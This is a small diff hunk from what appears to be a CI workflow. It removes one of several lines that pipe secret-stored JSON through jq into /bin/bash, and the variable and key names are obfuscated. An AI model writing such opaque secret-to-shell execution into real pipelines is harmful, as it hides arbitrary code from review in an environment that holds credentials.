@@ -23,7 +23,6 @@ jobs:
           nj028: ${{ secrets.nj028 }}
         run: |
           printf '%s' "$nj028" | jq -r .ixaap97 | /bin/bash
-          echo $xgla45478 | jq -r .yva3801 | /bin/bash
           echo $a66 | jq -r .kibkf347 | /bin/bash
           printf '%s' "$iobqf91" | jq -r .ld19324 | /bin/bash
 
